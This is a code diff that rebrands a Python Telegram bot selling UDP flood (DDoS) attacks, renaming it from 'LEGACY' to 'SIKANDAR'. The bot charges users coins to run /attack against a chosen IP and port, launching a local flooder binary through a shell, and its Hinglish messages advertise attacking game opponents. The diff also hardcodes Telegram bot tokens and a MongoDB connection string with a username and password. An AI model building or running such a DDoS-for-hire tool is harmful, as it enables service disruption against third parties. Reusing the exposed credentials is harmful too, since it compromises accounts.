@@ -9,13 +9,13 @@ attack_in_progress = False
 current_attack = None  # Store details of the current attack
 attack_history = []  # Store attack logs
 
-TELEGRAM_BOT_TOKEN = '7047464931:AAGd5JWEjY3aHftC5aDuZun5XcMTGhQixxw'
-ADMIN_USER_ID = 1342302666
+TELEGRAM_BOT_TOKEN = '7331346693:AAEbSuMRSQoiJfCAK_kR8dPFmtjF21ZwMK4'
+ADMIN_USER_ID = 1216702307
 MONGO_URI = "mongodb+srv://Kamisama:Kamisama@kamisama.m6kon.mongodb.net/"
-DB_NAME = "legacy"
+DB_NAME = "Sikandar"
 COLLECTION_NAME = "users"
 attack_in_progress = False
-ATTACK_TIME_LIMIT = 240  # Maximum attack duration in seconds
+ATTACK_TIME_LIMIT = 120  # Maximum attack duration in seconds
 COINS_REQUIRED_PER_ATTACK = 5  # Coins required for an attack
 
 # MongoDB setup
@@ -41,7 +41,7 @@ async def update_user(user_id, coins):
 async def start(update: Update, context: CallbackContext):
     chat_id = update.effective_chat.id
     message = (
-        "*❄️ WELCOME TO LEGACY ULTIMATE UDP FLOODER ❄️*\n\n"
+        "*❄️ WELCOME TO SIKANDAR ULTIMATE UDP FLOODER ❄️*\n\n"
         "*🔥 Yeh bot apko deta hai hacking ke maidan mein asli mazza! 🔥*\n\n"
         "*✨ Key Features: ✨*\n"
         "🚀 *𝘼𝙩𝙩𝙖𝙘𝙠 𝙠𝙖𝙧𝙤 𝙖𝙥𝙣𝙚 𝙤𝙥𝙥𝙤𝙣𝙚𝙣𝙩𝙨 𝙥𝙖𝙧 𝘽𝙜𝙢𝙞 𝙈𝙚 /attack*\n"
@@ -50,11 +50,11 @@ async def start(update: Update, context: CallbackContext):
         "*⚠️ Kaise Use Kare? ⚠️*\n"
         "*Commands ka use karo aur commands ka pura list dekhne ke liye type karo: /help*\n\n"
         "*💬 Queries or Issues? 💬*\n"
-        "*Contact Admin: @LEGACY4REAL0*"
+        "*Contact Admin: @God_x_Sikandar*"
     )
     await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')
     
-async def legacy(update: Update, context: CallbackContext):
+async def Sikandar(update: Update, context: CallbackContext):
     chat_id = update.effective_chat.id
     args = context.args
 
@@ -63,7 +63,7 @@ async def legacy(update: Update, context: CallbackContext):
         return
 
     if len(args) != 3:
-        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Tere ko simple command bhi nahi aati? Chal, sikh le: /legacy <add|rem> <user_id> <coins>*", parse_mode='Markdown')
+        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Tere ko simple command bhi nahi aati? Chal, sikh le: /Sikandar <add|rem> <user_id> <coins>*", parse_mode='Markdown')
         return
 
     command, target_user_id, coins = args
@@ -100,7 +100,7 @@ async def attack(update: Update, context: CallbackContext):
     if user["coins"] < COINS_REQUIRED_PER_ATTACK:
         await context.bot.send_message(
             chat_id=chat_id,
-            text="*💰 Bhai, tere paas toh coins nahi hai! Pehle admin ke paas ja aur coins le aa. 😂 DM:- @LEGACY4REAL0*",
+            text="*💰 Bhai, tere paas toh coins nahi hai! Pehle admin ke paas ja aur coins le aa. 😂 DM:- @God_x_Sikandar*",
             parse_mode='Markdown'
         )
         return
@@ -180,7 +180,7 @@ async def run_attack(chat_id, ip, port, duration, context):
     attack_in_progress = True
 
     try:
-        command = f"./bgmi {ip} {port} {duration} {9} {1000}"
+        command = f"./daku {ip} {port} {duration} {3} {700}"
         process = await asyncio.create_subprocess_shell(
             command,
             stdout=asyncio.subprocess.PIPE,
@@ -238,7 +238,7 @@ async def myinfo(update: Update, context: CallbackContext):
 async def help(update: Update, context: CallbackContext):
     chat_id = update.effective_chat.id
     message = (
-        "*🛠️ LEGACY VIP DDOS Bot Help Menu 🛠️*\n\n"
+        "*🛠️ SIKANDAR VIP DDOS Bot Help Menu 🛠️*\n\n"
         "🌟 *Yahan hai sab kuch jo tumhe chahiye!* 🌟\n\n"
         "📜 *Available Commands:* 📜\n\n"
         "1️⃣ *🔥 /attack <ip> <port> <duration>*\n"
@@ -254,7 +254,7 @@ async def help(update: Update, context: CallbackContext):
         "   - *Ab ye toh tum already use kar rahe ho! Yeh command bot ke saare features explain karta hai.*\n\n"
         "🚨 *𝐈𝐦𝐩𝐨𝐫𝐭𝐚𝐧𝐭 𝐓𝐢𝐩𝐬:* 🚨\n"
         "- *BOT REPLY NAA DE ISKA MATLAB KOI AUR BNDA ATTACK LAGYA HAI SO WAIT.*\n"
-        "- *Agar koi dikkat aaye toh admin ko contact karo: @LEGACY4REAL0*\n\n"
+        "- *Agar koi dikkat aaye toh admin ko contact karo: @God_x_Sikandar*\n\n"
         "💥 *Ab jao aur hacker banne ka natak shuru karo!* 💥"
     )
     await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')
@@ -262,7 +262,7 @@ async def help(update: Update, context: CallbackContext):
 def main():
     application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
     application.add_handler(CommandHandler("start", start))
-    application.add_handler(CommandHandler("legacy", legacy))
+    application.add_handler(CommandHandler("Sikandar", Sikandar))
     application.add_handler(CommandHandler("attack", attack))
     application.add_handler(CommandHandler("myinfo", myinfo))
     application.add_handler(CommandHandler("help", help))
